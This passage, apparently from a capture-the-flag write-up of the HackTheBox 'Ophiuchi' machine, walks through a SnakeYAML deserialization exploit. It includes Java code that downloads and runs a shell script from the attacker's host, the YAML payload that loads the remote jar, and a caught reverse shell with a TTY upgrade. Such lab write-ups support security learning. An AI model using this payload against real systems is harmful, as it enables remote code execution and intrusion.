
####################
## https://0xdf.gitlab.io/2021/07/03/htb-ophiuchi.html
####################
##
##
  
This can be done in one JAR payload:

 10     public AwesomeScriptEngineFactory() throws InterruptedException {
 11         try {
 12             Process p = Runtime.getRuntime().exec("curl http://10.10.14.7/shell.sh -o /dev/shm/.s.sh");
 13             p.waitFor();
 14             p = Runtime.getRuntime().exec("chmod +x /dev/shm/.s.sh");
 15             p.waitFor();
 16             p = Runtime.getRuntime().exec("/dev/shm/.s.sh");
 17         } catch (IOException e) {
 18             e.printStackTrace();
 19         }
 20     }
I’ll compile, Jar, and move it into www:

oxdf@parrot$ javac src/artsploit/AwesomeScriptEngineFactory.java
oxdf@parrot$ jar -cvf rev.jar -C src/ .
added manifest
adding: artsploit/(in = 0) (out= 0)(stored 0%)
adding: artsploit/AwesomeScriptEngineFactory.class(in = 1837) (out= 784)(deflated 57%)
adding: artsploit/AwesomeScriptEngineFactory.java(in = 1730) (out= 462)(deflated 73%)
ignoring entry META-INF/
adding: META-INF/services/(in = 0) (out= 0)(stored 0%)
adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)
oxdf@parrot$ mv rev.jar www/
The payload is:

!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.7/rev.jar"]
  ]]
]
There’s three requests at the Python HTTP server, two for the Jar, and then for the shell:

10.10.10.227 - - [15/Feb/2021 09:19:52] "GET /rev.jar HTTP/1.1" 200 -
10.10.10.227 - - [15/Feb/2021 09:19:52] "GET /rev.jar HTTP/1.1" 200 -
10.10.10.227 - - [15/Feb/2021 09:19:52] "GET /shell.sh HTTP/1.1" 200 -
Then there’s a shell at listening nc:

oxdf@parrot$ sudo nc -lnvp 443                  
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.227] 37728
bash: cannot set terminal process group (730): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@ophiuchi:/$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
I’ll upgrade my shell with the standard Python trick:

tomcat@ophiuchi:/$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
tomcat@ophiuchi:/$ ^Z
[1]+  Stopped                 sudo nc -lnvp 443
oxdf@parrot$ stty raw -echo ; fg
sudo nc -lnvp 443
                 reset
reset: unknown terminal type unknown
Terminal type? screen
tomcat@ophiuchi:/$ 

